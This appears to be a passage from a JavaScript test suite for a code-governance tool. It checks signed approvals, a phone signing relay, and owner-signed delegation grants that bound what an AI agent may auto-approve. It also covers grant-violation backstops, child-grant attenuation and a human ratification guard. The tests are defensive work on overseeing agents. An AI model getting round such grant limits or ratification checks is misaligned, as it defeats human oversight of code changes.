  await dpost('/api/request', { mode: 'authorize', event: gevent, summary: 'enroll Sam', ownerPubs: [phoneKp.pubB64] });
  ok((await dget('/api/session')).event.name === 'Sam', 'v2 relay: phone sees the governance event to authorize via /api/session');
  const asig = C.sign(canonical(gevent), phoneKp.privDer);
  await dpost('/api/submit', { signature: asig });
  const ares = await dget('/api/result');
  ok(ares.result && C.verify(canonical(gevent), ares.result.signature, phoneKp.pubB64), 'v2 relay: CLI /api/result returns a valid governance-event signature');
  await dpost('/api/final', { final: { ok: true } });
  ok((await dget('/api/result')).gone === true, 'v2 relay: /api/result reports the slot is gone once cleared');
  // cert distribution: without a cert configured, nothing to install.
  ok((await fetch(dbase + '/ca.crt')).status === 404, 'v2 cert: /ca.crt is 404 when no certificate is configured (http run)');
  ok((await fetch(dbase + '/trust').then((r) => r.text())).includes('nothing to trust'), 'v2 cert: /trust explains there is nothing to trust over http');
  }
  ds.close();

  // cert distribution: the dashboard serves the CA for the phone to install + a guided page.
  const certDash = await startDashboard({ buildMapHTML: () => ({ html: '<html></html>', count: 0 }), version: () => 'A' }, { port: 0, caPem: '-----BEGIN CERTIFICATE-----\nMIIByay\n-----END CERTIFICATE-----\n', caFilename: 'yaylayer-rootCA.crt' });
  const certBase = 'http://127.0.0.1:' + certDash.port;
  const certRes = await fetch(certBase + '/ca.crt');
  ok(certRes.headers.get('content-type') === 'application/x-x509-ca-cert', 'v2 cert: /ca.crt is served with the x509-ca-cert content-type (so iOS/Android offer to install it)');
  ok((certRes.headers.get('content-disposition') || '').includes('yaylayer-rootCA.crt'), 'v2 cert: /ca.crt downloads with the configured filename');
  ok((await certRes.text()).includes('BEGIN CERTIFICATE'), 'v2 cert: /ca.crt returns the certificate PEM');
  ok((await fetch(certBase + '/ca.pem').then((r) => r.text())).includes('BEGIN CERTIFICATE'), 'v2 cert: /ca.pem is an alias for the same certificate');
  const certTrust = await fetch(certBase + '/trust').then((r) => r.text());
  ok(certTrust.includes('Download the certificate') && /iPhone|iPad/.test(certTrust) && /Android/.test(certTrust), 'v2 cert: /trust is a guided install page for iOS + Android');
  certDash.close();

  // Briefs (Standard §5): a signed prose headline over a change-set, editable on the
  // phone, tamper-evident because it rides inside the signed approval.
  {
    const mkp = C.generateKeypair();
    const md = await startDashboard({ buildMapHTML: () => ({ html: '<html></html>', count: 0 }), version: () => 'A' }, { port: 0 });
    const mbase = 'http://127.0.0.1:' + md.port;
    const mpost = (path, b) => fetch(mbase + path, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(b || {}) });
    const mget = (path) => fetch(mbase + path).then((r) => r.json());
    const mapproval = { id: 'A-1', project: 'm', prev: 'genesis', nonce: 'n1', at: '2026-01-01', signer: 'Alex', brief: { text: 'Original brief', orderedBy: 'human (AI-drafted, human-approved)' }, items: { 'C-1': 'hash1' } };
    ok((await fetch(mbase + '/phone').then((r) => r.text())).includes('BRIEF'), 'v2 brief: the phone signer page renders a BRIEF card');
    await mpost('/api/request', { mode: 'approve', approval: mapproval, summary: 'x', expectPubB64: [mkp.pubB64] });
    ok((await mget('/api/session')).approval.brief.text === 'Original brief', 'v2 brief: the phone sees the brief inside the approval session');
    ok((await mpost('/api/submit', { signature: C.sign(canonical(mapproval), mkp.privDer) })).status === 200, 'v2 brief: signing the unedited brief verifies');
    await mpost('/api/final', { final: { ok: true } });
    // an EDITED brief
    await mpost('/api/request', { mode: 'approve', approval: mapproval, summary: 'x', expectPubB64: [mkp.pubB64] });
    const medited = { ...mapproval, brief: { ...mapproval.brief, text: 'Edited by the human' } };
    const msigE = C.sign(canonical(medited), mkp.privDer);
    ok((await mpost('/api/submit', { signature: msigE })).status === 400, 'v2 brief: an edited-text signature is rejected unless the edit is declared (bytes must match)');
    ok((await mpost('/api/submit', { signature: msigE, brief: 'Edited by the human' }).then((r) => r.json())).ok === true, 'v2 brief: a declared phone edit verifies against the rebuilt approval');
    ok((await mget('/api/result')).result.brief === 'Edited by the human', 'v2 brief: the relay returns the edited brief text so the seal stores what was signed');
    md.close();
    // tamper-evidence: the seal covers the brief (canonical over the whole approval minus signature).
    const msig = C.sign(canonical(mapproval), mkp.privDer);
    ok(C.verify(canonical(mapproval), msig, mkp.pubB64) === true, 'v2 brief: a valid seal over the brief verifies');
    ok(C.verify(canonical({ ...mapproval, brief: { ...mapproval.brief, text: 'sneaky change' } }), msig, mkp.pubB64) === false, 'v2 brief: editing the sealed brief text breaks the signature (tamper-evident)');
  }

  // Dashboard "Request a change": queue a plain human request the AI turns into a Brief+Cells.
  {
    let gotText = null;
    const sd = await startDashboard({ buildMapHTML: () => ({ html: '<html><body></body></html>', count: 0 }), version: () => 'A', addRequest: (t) => { gotText = t; return { ok: true, id: 'REQ-001' }; } }, { port: 0 });
    const sb = 'http://127.0.0.1:' + sd.port;
    const sp = (path, b) => fetch(sb + path, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(b || {}) });
    ok((await sp('/api/request/create', {})).status === 400, 'v2 request: /api/request/create requires text (400 without it)');
    const rres = await sp('/api/request/create', { text: 'add rate limiting to login' }).then((r) => r.json());
    ok(rres.ok === true && rres.id === 'REQ-001' && gotText === 'add rate limiting to login', 'v2 request: /api/request/create invokes addRequest with the text');
    ok((await fetch(sb + '/').then((r) => r.text())).includes('yd-req'), 'v2 request: the live dashboard bar has a Request-a-change button');
    sd.close();
  }

  // Dashboard policy editor: add/remove a draft rule + apply routes owner-sign to the phone.
  {
    let rules = []; let applied = false;
    const sd = await startDashboard({ buildMapHTML: () => ({ html: '<html><body></body></html>', count: 0 }), version: () => 'A',
      policyAddRule: (r) => { if (!r.signer) return { ok: false, error: 'need a signer' }; rules.push(r); return { ok: true, rules }; },
      policyRemoveRule: (i) => { rules.splice(i, 1); return { ok: true, rules }; },
      policyApply: () => { applied = true; return Promise.resolve({ ok: true, output: 'signed' }); } }, { port: 0 });
    const sb = 'http://127.0.0.1:' + sd.port;
    const sp = (path, b) => fetch(sb + path, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(b || {}) }).then((r) => r.json());
    ok((await sp('/api/policy/rule', { match: { path: '**/auth/**' }, signer: 'Sara' })).ok === true && rules.length === 1, 'v2 policy: /api/policy/rule adds a draft rule');
    ok((await sp('/api/policy/rule', { match: { tag: 'security' } })).ok === false, 'v2 policy: a rule with no signer is rejected');
    ok((await sp('/api/policy/apply', {})).ok === true && applied, 'v2 policy: /api/policy/apply owner-signs the draft');
    ok((await sp('/api/policy/remove', { index: 0 })).ok === true && rules.length === 0, 'v2 policy: /api/policy/remove drops a draft rule');
    sd.close();
  }

  // Dashboard tag-pool editor: add/rename/remove/describe route to tagsEdit (used-tag guard).
  {
    let last = null;
    const sd = await startDashboard({ buildMapHTML: () => ({ html: '<html><body></body></html>', count: 0 }), version: () => 'A',
      tagsEdit: (op) => { last = op; return (op.action === 'rename' && op.from === 'UI') ? { ok: false, error: 'used in signed Briefs' } : { ok: true }; } }, { port: 0 });
    const sb = 'http://127.0.0.1:' + sd.port;
    const sp = (path, b) => fetch(sb + path, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(b || {}) }).then((r) => r.json());
    ok((await sp('/api/tags/edit', { action: 'add', label: 'Payments' })).ok === true && last.label === 'Payments', 'v2 tags: /api/tags/edit routes an add to tagsEdit');
    ok((await sp('/api/tags/edit', { action: 'set', set: 'responsibility' })).ok === true && last.action === 'set', 'v2 tags: /api/tags/edit routes a starter-set pick to tagsEdit');
    ok((await sp('/api/tags/edit', { action: 'rename', from: 'UI', to: 'X' })).ok === false, 'v2 tags: renaming a used tag is refused (would split history)');
    sd.close();
  }

  // Dashboard Preview: list / run / stop package.json scripts through the dashboard.
  {
    let ran = null, stopped = null;
    const sd = await startDashboard({ buildMapHTML: () => ({ html: '<html><body></body></html>', count: 0 }), version: () => 'A',
      scripts: () => ({ scripts: [{ name: 'dev', cmd: 'vite' }], running: [] }),
      runScript: (n) => { ran = n; return { ok: true }; },
      stopScript: (n) => { stopped = n; return { ok: true }; } }, { port: 0 });
    const sb = 'http://127.0.0.1:' + sd.port;
    const g = await fetch(sb + '/api/scripts').then((r) => r.json());
    ok(g.scripts && g.scripts[0] && g.scripts[0].name === 'dev', 'v2 preview: /api/scripts lists package.json scripts');
    const sp = (path, b) => fetch(sb + path, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(b || {}) }).then((r) => r.json());
    ok((await sp('/api/scripts/run', { name: 'dev' })).ok === true && ran === 'dev', 'v2 preview: /api/scripts/run runs a script');
    ok((await sp('/api/scripts/stop', { name: 'dev' })).ok === true && stopped === 'dev', 'v2 preview: /api/scripts/stop stops it');
    sd.close();
  }

  // Dashboard batch settings: set the barrier / toggle through the dashboard.
  {
    let saved = null;
    const sd = await startDashboard({ buildMapHTML: () => ({ html: '<html><body></body></html>', count: 0 }), version: () => 'A',
      batchSet: (op) => { saved = op; return { ok: true, batch: { enabled: op.enabled !== false, barrier: op.barrier || 5 } }; } }, { port: 0 });
    const sb = 'http://127.0.0.1:' + sd.port;
    const r = await fetch(sb + '/api/batch', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ enabled: true, barrier: 8 }) }).then((x) => x.json());
    ok(r.ok === true && r.batch.barrier === 8 && saved.barrier === 8, 'v2 batch: /api/batch sets the barrier');
    sd.close();
  }

  // Briefs ledger renders as a tab in the map (the readable history of what was ordered).
  {
    const { renderMap } = require('../src/map');
    const mhtml = renderMap({ root: '/tmp', cells: {} }, { results: {}, counts: {}, passed: true }, 'demo', [], {}, null, { signedRoster: true, rootFp: 'A', signers: [] }, [{ id: 'A-2', at: '2026-08-25', signer: 'Alex', text: 'Persist the high score between sessions', cells: ['C-1', 'C-2'] }]);
    ok(mhtml.includes('data-tab="briefs"') && mhtml.includes('renderBriefs'), 'v2 briefs-tab: the map renders a Briefs tab');
    ok(mhtml.includes('Persist the high score between sessions'), 'v2 briefs-tab: the ledger embeds the brief text');
    ok(mhtml.includes("querySelectorAll('.mcell.known')") && mhtml.includes('openDetail(ch.getAttribute'), 'v2 briefs-tab: brief cells are clickable chips that open the Cell detail');
    ok(mhtml.includes('seal invalid') && mhtml.includes('✓ signed') && mhtml.includes('m.valid'), 'v2 briefs-tab: the ledger marks each brief valid (✓ signed) or tampered (⚠ seal invalid)');
  }

  // E2E (hosted relay transport): TweetNaCl secretbox seal/open, matching the phone page.
  {
    const E2E = require('../src/e2e');
    const key = E2E.newKey();
    const blob = E2E.seal(key, { mode: 'approve', secret: 'persist-the-high-score' });
    ok(blob.n && blob.c && JSON.stringify(blob).indexOf('persist-the-high-score') === -1, 'e2e: seal() produces opaque ciphertext (no plaintext leaks to the relay)');
    const got = E2E.open(key, blob);
    ok(got && got.mode === 'approve' && got.secret === 'persist-the-high-score', 'e2e: open() with the right key recovers the object');
    ok(E2E.open(E2E.newKey(), blob) === null, 'e2e: a wrong key cannot open the blob');
    ok(Buffer.compare(Buffer.from(E2E.fromB64url(E2E.b64url(key))), Buffer.from(key)) === 0, 'e2e: b64url key roundtrips (as carried in the QR #fragment)');
    ok(/^[A-Za-z0-9_-]{16,128}$/.test(E2E.newChannel()), 'e2e: newChannel() is a valid relay channel id');
  }

  // Freedom mode — scoped, owner-signed delegation grants (auto-approval).
  {
    const G = require('../src/grants');
    const rmod = require('../src/roster');
    // pure scope logic
    ok(G.isSensitive({ spec: { sensitive: 'yes' } }) === true && G.isSensitive({ spec: {} }) === false, 'grants: isSensitive flags sensitive / code-pinned Cells');
    ok(G.grantCoversCell({ scope: {} }, 'C-1', { spec: {} }) === true && G.grantCoversCell({ scope: {} }, 'C-2', { spec: { sensitive: 'yes' } }) === false, 'grants: default scope covers non-sensitive Cells, never sensitive ones');
    ok(G.grantCoversCell({ scope: { cells: ['C-1'] } }, 'C-2', { spec: {} }) === false, 'grants: an explicit cell allow-list narrows scope');

    // end-to-end through verifyManifest
    const gdir = fs.mkdtempSync(require('path').join(os.tmpdir(), 'yay-grant-'));
    fs.writeFileSync(require('path').join(gdir, 'm.js'), '//∷YAY⟨C-1⟩\n//  unit: add\n//  intent: add two numbers\n//  in: (a:number,b:number)\n//  out: number\n//  pure: yes\n//  ensures: out === a + b\n//∷YAY-END⟨C-1⟩\nfunction add(a,b){return a+b;}\n');
    const gm = buildManifest(gdir);
    const sh = gm.cells['C-1'].specHash;
    const owner = C.generateKeypair();
    const genesis = { id: 'R-0001', type: 'genesis', role: 'owner', prev: 'genesis', nonce: 'n', at: '2026-01-01T00:00:00Z', name: 'Alex', pub: owner.pubB64, by: 'Alex' };
    genesis.signature = C.sign(rmod.eventBytes(genesis), owner.privDer);
    const rosterLog = { events: [genesis] };
    const gk = C.generateKeypair();
    const mkGrant = (over) => { const g = { id: 'G-1', type: 'grant', grantPub: gk.pubB64, scope: {}, expiresAt: '2099-01-01T00:00:00Z', maxCount: 5, by: 'Alex', prev: 'R-0001', nonce: 'gn', at: '2026-01-02T00:00:00Z', ...over }; g.signature = C.sign(rmod.eventBytes(g), (over && over._signer) || owner.privDer); delete g._signer; return g; };
    const grant = mkGrant();
    const autoAp = (at) => { const a = { id: 'A-0001', project: 'g', prev: 'genesis', nonce: 'an', at, signer: 'Alex', autoApproved: true, grant: 'G-1', items: { 'C-1': sh } }; a.signature = C.sign(canonical(a), gk.privDer); return a; };
    const V = (approvals, gevents) => verifyManifest(gm, { approvals }, { signers: {} }, { roster: rosterLog, grants: { events: gevents } });

    let v = V([autoAp('2026-06-01T00:00:00Z')], [grant]);
    ok(v.results['C-1'].trust.auto === true && v.results['C-1'].trust.signed === true, 'grants: a valid auto-approval is accepted and marked AUTO on the trust axis');
    ok(v.results['C-1'].state === 'GREEN', 'grants: an auto-approved Cell whose code matches its spec is GREEN');
    ok(v.counts.auto === 1, 'grants: counts.auto reports the delegated (unratified) Cell');

    ok(V([autoAp('2026-06-01T00:00:00Z')], [mkGrant({ _signer: gk.privDer })])['results']['C-1'].state === 'UNSIGNED', 'grants: an auto-approval under a grant NOT signed by an owner is rejected (Unsigned)');
    ok(V([autoAp('2026-06-01T00:00:00Z')], [mkGrant({ expiresAt: '2026-03-01T00:00:00Z' })])['results']['C-1'].state === 'UNSIGNED', 'grants: an auto-approval after the grant expired is rejected');

    const revoke = (() => { const r = { id: 'G-2', type: 'grant-revoke', grant: 'G-1', by: 'Alex', prev: 'G-1', nonce: 'rn', at: '2026-05-01T00:00:00Z' }; r.signature = C.sign(rmod.eventBytes(r), owner.privDer); return r; })();
    ok(V([autoAp('2026-06-01T00:00:00Z')], [grant, revoke])['results']['C-1'].state === 'UNSIGNED', 'grants: an auto-approval AFTER the grant was revoked is rejected');
    ok(V([autoAp('2026-04-01T00:00:00Z')], [grant, revoke])['results']['C-1'].trust.auto === true, 'grants: an auto-approval BEFORE the revoke stays valid (forward-looking revocation)');

    const human = (() => { const h = { id: 'A-0002', project: 'g', prev: 'A-0001', nonce: 'hn', at: '2026-07-01T00:00:00Z', signer: 'Alex', items: { 'C-1': sh } }; h.signature = C.sign(canonical(h), owner.privDer); return h; })();
    v = V([autoAp('2026-06-01T00:00:00Z'), human], [grant]);
    ok(v.results['C-1'].trust.auto === false && v.results['C-1'].trust.signed === true, 'grants: a human ratification supersedes the AUTO seal (trust becomes human)');

    // TOCTOU: the reviewed-bundle hash is deterministic and MOVES when the delegated code changes,
    // so `yay ratify --sign` can refuse to sign anything other than exactly what was reviewed.
    const Rt = require('../src/ratify');
    const vAuto = V([autoAp('2026-06-01T00:00:00Z')], [grant]);
    ok(Rt.autoCellIds(vAuto).join(',') === 'C-1', 'ratify: autoCellIds lists the delegated Cell awaiting ratification');
    const rb1 = Rt.ratifyBundle(gm, vAuto);
    ok(!!rb1.hash && rb1.hash === Rt.ratifyBundle(gm, vAuto).hash, 'ratify: the reviewed-bundle hash is deterministic');
    const gm2 = JSON.parse(JSON.stringify(gm)); gm2.cells['C-1'].unitBody = (gm.cells['C-1'].unitBody || '') + ' /*changed*/';
    ok(Rt.ratifyBundle(gm2, vAuto).hash !== rb1.hash, 'ratify: the bundle hash changes when the delegated code moves (TOCTOU guard trips → --sign refuses)');
    fs.rmSync(gdir, { recursive: true, force: true });

    // ── P3: capability envelopes, owner-signed non-delegable backstop, grant violations ──
    {
      const pol = require('../src/policy');
      const cellUI = { file: 'src/ui/button.js', spec: {} };
      const cellAuth = { file: 'src/auth/login.js', spec: {} };
      const cellHigh = { file: 'src/ui/x.js', spec: { risk: 'high' } };
      // path envelope: allow src/ui/**, deny src/ui/secret/**
      const envG = { envelope: { allow: ['src/ui/**'], deny: ['src/ui/secret/**'] } };
      ok(G.grantCoversCell(envG, 'C', cellUI) === true, 'p3-envelope: a Cell inside allow paths is covered');
      ok(G.grantCoversCell(envG, 'C', cellAuth) === false, 'p3-envelope: a Cell outside allow paths is refused');
      ok(G.grantCoversCell(envG, 'C', { file: 'src/ui/secret/k.js', spec: {} }) === false, 'p3-envelope: a deny path overrides allow');
      // max-risk
      ok(G.grantCoversCell({ envelope: { maxRisk: 'medium' } }, 'C', cellHigh) === false, 'p3-envelope: a Cell above the grant max-risk is refused');
      ok(G.grantCoversCell({ envelope: { maxRisk: 'high' } }, 'C', cellHigh) === true, 'p3-envelope: max-risk high covers a high-risk Cell');
      // owner-signed non-delegable policy is the AUTHORITATIVE backstop (spec markers are cooperative)
      const ndPolicy = { rules: [{ match: { path: '**/auth/**' }, delegable: false }] };
      ok(pol.nonDelegable(ndPolicy, cellAuth) === true, 'p3-nondelegable: owner-signed policy marks matching paths non-delegable');
      ok(G.grantCoversCell({ envelope: { allow: ['src/**'] } }, 'C', cellAuth, { policy: ndPolicy }) === false, 'p3-nondelegable: policy overrides an otherwise-in-scope grant');

      // end-to-end grant VIOLATION backstop: a real grant-key signature over an out-of-envelope Cell
      // → gate-blocking RED, not a silent drop. (Agent cannot widen its own grant.)
      const vdir = fs.mkdtempSync(require('path').join(os.tmpdir(), 'yay-viol-'));
      fs.mkdirSync(require('path').join(vdir, 'auth'), { recursive: true });
      fs.writeFileSync(require('path').join(vdir, 'auth', 'a.js'), '//∷YAY⟨C-9⟩\n//  unit: tok\n//  intent: make a token\n//  pure: yes\n//  ensures: out === 1\n//∷YAY-END⟨C-9⟩\nfunction tok(){return 1;}\n');
      const vm = buildManifest(vdir);
      const sh9 = vm.cells['C-9'].specHash;
      const gk2 = C.generateKeypair();
      const narrowGrant = (() => { const g = { id: 'G-1', type: 'grant', grantPub: gk2.pubB64, envelope: { allow: ['ui/**'] }, expiresAt: '2099-01-01T00:00:00Z', maxCount: 5, by: 'Alex', prev: 'R-0001', nonce: 'gn', at: '2026-01-02T00:00:00Z' }; g.signature = C.sign(rmod.eventBytes(g), owner.privDer); return g; })();
      const vAp = (() => { const a = { id: 'A-0001', project: 'g', prev: 'genesis', nonce: 'an', at: '2026-06-01T00:00:00Z', signer: 'Alex', autoApproved: true, grant: 'G-1', items: { 'C-9': sh9 } }; a.signature = C.sign(canonical(a), gk2.privDer); return a; })();
      const vv = verifyManifest(vm, { approvals: [vAp] }, { signers: {} }, { roster: rosterLog, grants: { events: [narrowGrant] } });
      ok(vv.results['C-9'].state === 'RED', 'p3-violation: an in-window grant-signed approval outside the envelope is RED (backstop), not a silent drop');
      ok(vv.results['C-9'].trust.violation && /outside|allowed|deny|non-delegable/i.test(vv.results['C-9'].trust.violation.reason), 'p3-violation: the RED carries a grant-violation reason');
      ok(vv.passed === false, 'p3-violation: a grant violation blocks the gate');
      fs.rmSync(vdir, { recursive: true, force: true });

      // ── child grants: strict attenuation; the verifier refuses a child exceeding its parent ──
      const parentG = { id: 'G-1', type: 'grant', grantPub: 'PPUB', envelope: { allow: ['src/**'], childGrants: { allowed: true, maxDepth: 1 } }, expiresAt: '2099-01-01T00:00:00Z', maxCount: 8 };
      ok(G.attenuates({ envelope: { allow: ['src/ui/**'] }, maxCount: 4, expiresAt: '2098-01-01T00:00:00Z' }, parentG).ok === true, 'p3-child: a strictly-narrower child attenuates its parent');
      ok(G.attenuates({ envelope: { allow: ['other/**'] }, maxCount: 4 }, parentG).ok === false, 'p3-child: a child allowing paths outside the parent is refused');
      ok(G.attenuates({ envelope: { allow: ['src/ui/**'] }, maxCount: 99 }, parentG).ok === false, 'p3-child: a child with a larger count is refused');
      const noKids = { id: 'G-1', type: 'grant', grantPub: 'PPUB', envelope: { allow: ['src/**'] }, maxCount: 8 };
      ok(G.attenuates({ envelope: { allow: ['src/ui/**'] }, maxCount: 4 }, noKids).ok === false, 'p3-child: a parent that does not permit child grants refuses all children');

      // child grant validated through deriveGrants: signed by the PARENT grant key, chains to owner
      const pk = C.generateKeypair();
      const rootG = (() => { const g = { id: 'G-1', type: 'grant', grantPub: pk.pubB64, envelope: { allow: ['src/**'], childGrants: { allowed: true, maxDepth: 1 } }, expiresAt: '2099-01-01T00:00:00Z', maxCount: 8, by: 'Alex', prev: 'R-0001', nonce: 'g1', at: '2026-01-02T00:00:00Z' }; g.signature = C.sign(rmod.eventBytes(g), owner.privDer); return g; })();
      const ck = C.generateKeypair();
      const childG = (() => { const g = { id: 'G-2', type: 'grant', parent: 'G-1', issuedBy: pk.pubB64, grantPub: ck.pubB64, envelope: { allow: ['src/ui/**'] }, expiresAt: '2098-01-01T00:00:00Z', maxCount: 4, prev: 'G-1', nonce: 'g2', at: '2026-01-03T00:00:00Z' }; g.signature = C.sign(rmod.eventBytes(g), pk.privDer); return g; })();
      const ownerPubs = [owner.pubB64];
      const derived = G.deriveGrants({ events: [rootG, childG] }, ownerPubs, []);
      ok(derived['G-2'].ownerOk === true && derived['G-2'].active === true, 'p3-child: a properly attenuating child signed by the parent grant key chains to the owner root');
      // forged child: signed by a random key, not the parent's grant key → rejected
      const forged = (() => { const g = { id: 'G-3', type: 'grant', parent: 'G-1', issuedBy: pk.pubB64, grantPub: ck.pubB64, envelope: { allow: ['src/ui/**'] }, expiresAt: '2098-01-01T00:00:00Z', maxCount: 4, prev: 'G-2', nonce: 'g3', at: '2026-01-03T00:00:00Z' }; g.signature = C.sign(rmod.eventBytes(g), C.generateKeypair().privDer); return g; })();
      ok(G.deriveGrants({ events: [rootG, forged] }, ownerPubs, [])['G-3'].ownerOk === false, 'p3-child: a child NOT signed by the parent grant key is rejected');
      // over-broad child: allows paths beyond the parent → rejected even if signed correctly
      const broad = (() => { const g = { id: 'G-4', type: 'grant', parent: 'G-1', issuedBy: pk.pubB64, grantPub: ck.pubB64, envelope: { allow: ['/etc/**'] }, expiresAt: '2098-01-01T00:00:00Z', maxCount: 4, prev: 'G-2', nonce: 'g4', at: '2026-01-03T00:00:00Z' }; g.signature = C.sign(rmod.eventBytes(g), pk.privDer); return g; })();
      ok(G.deriveGrants({ events: [rootG, broad] }, ownerPubs, [])['G-4'].ownerOk === false, 'p3-child: an over-broad child (paths beyond parent) is rejected even when correctly signed');
      // revoked parent cascades → child inactive
      const revP = (() => { const r = { id: 'G-5', type: 'grant-revoke', grant: 'G-1', by: 'Alex', prev: 'G-2', nonce: 'r1', at: '2026-02-01T00:00:00Z' }; r.signature = C.sign(rmod.eventBytes(r), owner.privDer); return r; })();
      ok(G.deriveGrants({ events: [rootG, childG, revP] }, ownerPubs, [])['G-2'].active === false, 'p3-child: revoking the parent cascades — the child goes inactive');
    }

    // The in-code AUTO stamp lives ABOVE the marker (outside the block), so it must not
    // change the specHash — otherwise stamping would break the very seal it describes.
    const sd = fs.mkdtempSync(require('path').join(os.tmpdir(), 'yay-stamp-'));
    const block = '//∷YAY⟨C-1⟩\n//  unit: add\n//  intent: x\n//  ensures: out === a + b\n//∷YAY-END⟨C-1⟩\nfunction add(a,b){return a+b;}\n';
    fs.writeFileSync(require('path').join(sd, 'm.js'), block);
    const h1 = buildManifest(sd).cells['C-1'].specHash;
    fs.writeFileSync(require('path').join(sd, 'm.js'), '//∷YAY-DELEGATED⟨C-1⟩ delegated · grant G-001 · awaiting ratification\n' + block);
    const m2 = buildManifest(sd);
    ok(m2.cells['C-1'] && m2.cells['C-1'].specHash === h1, 'delegated-stamp: a //∷YAY-DELEGATED line above the marker does NOT change the specHash (the seal survives stamping)');
    fs.rmSync(sd, { recursive: true, force: true });

    // P1 spec archive: content-addressed store roundtrip + tamper-evidence, and the invariant that
    // lets "as signed" reconstruction be git-independent — sha256(specBlock) === specHash.
    const O = require('../src/objects');
    const od = fs.mkdtempSync(require('path').join(os.tmpdir(), 'yay-obj-'));
    fs.mkdirSync(require('path').join(od, '.yaylayer'), { recursive: true });
    const oh = O.putObject(od, 'a spec block');
    ok(O.getObject(od, oh) === 'a spec block', 'objects: put → get roundtrip');
    ok(O.getObject(od, 'deadbeef') === null, 'objects: a missing hash returns null');
    fs.writeFileSync(O.objPath(od, oh), 'tampered');
    ok(O.getObject(od, oh) === null, 'objects: tampered content fails the hash check (returns null)');
    const cd2 = fs.mkdtempSync(require('path').join(os.tmpdir(), 'yay-cellhash-'));
    fs.writeFileSync(require('path').join(cd2, 'm.js'), '//∷YAY⟨C-1⟩\n// unit: add\n// ensures: out === a + b\n//∷YAY-END⟨C-1⟩\nfunction add(a,b){return a+b;}\n');
    const cc = buildManifest(cd2).cells['C-1'];
    ok(C.sha256(cc.specBlock) === cc.specHash, 'objects: sha256(specBlock) === specHash — a signed spec is retrievable from the archive by its signedHash (no git needed)');
    fs.rmSync(od, { recursive: true, force: true }); fs.rmSync(cd2, { recursive: true, force: true });
  }

  // P1.5 languages: langNameOf tells brace-family languages apart; per-language effect nets police
  // `pure: yes` in each; the Ruby/PHP provers run only when their runtime is installed.
  {
    const { langNameOf } = require('../src/util');
    ok(langNameOf('a.rb') === 'ruby' && langNameOf('a.php') === 'php' && langNameOf('a.sol') === 'solidity' && langNameOf('a.rs') === 'rust' && langNameOf('a.cs') === 'csharp', 'langNameOf: php/solidity/rust/csharp are told apart (all body-family "brace")');
    const mkc = (ext, body) => { const d = fs.mkdtempSync(require('path').join(os.tmpdir(), 'yay-l-')); fs.writeFileSync(require('path').join(d, 'a.' + ext), body); return d; };
    const noteHas = (d, id, re) => { const v = verifyManifest(buildManifest(d), { approvals: [] }, { signers: {} }, {}); return ((v.results[id] || {}).notes || []).some((n) => re.test(n.text)); };
    let d = mkc('rb', '#∷YAY⟨C-1⟩\n# unit: w\n# pure: yes\n#∷YAY-END⟨C-1⟩\ndef w(x)\n  File.write("/tmp/x", x)\nend\n');
    ok(noteHas(d, 'C-1', /purity violated.*filesystem/), 'effect net (Ruby): `pure: yes` with File.write → purity violated');
    fs.rmSync(d, { recursive: true, force: true });
    d = mkc('php', '<?php\n//∷YAY⟨C-1⟩\n// unit: w\n// pure: yes\n//∷YAY-END⟨C-1⟩\nfunction w($x){ file_put_contents("/tmp/x", $x); }\n');
    ok(noteHas(d, 'C-1', /purity violated.*filesystem/), 'effect net (PHP): `pure: yes` with file_put_contents → purity violated');
    fs.rmSync(d, { recursive: true, force: true });
    const P = require('../src/prove');
    d = mkc('rb', '#∷YAY⟨C-1⟩\n# unit: add\n# in: (a:number, b:number)\n# out: number\n# pure: yes\n# ensures: out == a + b\n#∷YAY-END⟨C-1⟩\ndef add(a,b)\n  a + b\nend\n');
    const pr = P.proveManifest(buildManifest(d))['C-1'] || {};
    if (!/ruby-missing/.test(pr.reason || '')) ok(pr.status === 'pass', 'prover (Ruby): a pure method with a true `ensures` is machine-proven'); // only when `ruby` is present
    fs.rmSync(d, { recursive: true, force: true });
  }

  // spec-only adversary: an LLM sees ONLY the spec (never the code) and tries to break it.
  const A = require('../src/adversary');
  const advDir = fs.mkdtempSync(require('path').join(os.tmpdir(), 'yay-adv-'));
  const specBlock = '//∷YAY⟨C-1⟩\n//  unit: add\n//  in: (a:number,b:number)\n//  out: number\n//  pure: yes\n//  ensures: out === a + b\n//∷YAY-END⟨C-1⟩\n';
  // the LLM proposes INPUTS only (spec-only); our deterministic checker judges them.
  const fakeChat = async () => '[[1,1],[2,3],[-2,-2],[10,-4]]';
  fs.writeFileSync(require('path').join(advDir, 'm.js'), specBlock + 'function add(a,b){return a-b;}\n'); // BUG
  let am = await A.adversaryManifest(buildManifest(advDir), { provider: 'x' }, { chat: fakeChat });
  ok(am['C-1'].status === 'broke' && /ensures failed/.test(am['C-1'].counterexample), 'adversary: proposed inputs + deterministic judge BREAK buggy code (machine-confirmed counterexample)');
  fs.writeFileSync(require('path').join(advDir, 'm.js'), specBlock + 'function add(a,b){return a+b;}\n'); // fixed
  am = await A.adversaryManifest(buildManifest(advDir), { provider: 'x' }, { chat: fakeChat });
  ok(am['C-1'].status === 'survived', 'adversary: the same inputs SURVIVE once the code matches the spec (no false positive)');
  // false-positive guard: a bad expectation can no longer break it — the machine judges, not the LLM.
  fs.writeFileSync(require('path').join(advDir, 'e.js'), '//∷YAY⟨C-2⟩\n//  unit: idnum\n//  in: (a:number)\n//  out: number\n//  pure: yes\n//  ensures: out === a\n//∷YAY-END⟨C-2⟩\nfunction idnum(a){return a;}\n');
  const am2 = await A.adversaryManifest(buildManifest(advDir), { provider: 'x' }, { chat: async () => '[[0],[-5],[999]]' });
  ok(am2['C-2'].status === 'survived', 'adversary: correct code survives even hostile inputs (no LLM-judgment false positives)');
  // effect-recording: instrument a side-effecting fn and assert on its recorded trace
  const rec = require('../src/record').makeRecorder();
  rec.proxy.fillStyle = '#00f'; rec.proxy.fillRect(0, 0, 9, 9);
  ok(rec.trace.some((e) => e.type === 'set' && e.name === 'fillStyle' && e.value === '#00f') && rec.trace.some((e) => e.type === 'call' && e.name === 'fillRect'), 'record: recorder logs property sets and method calls');
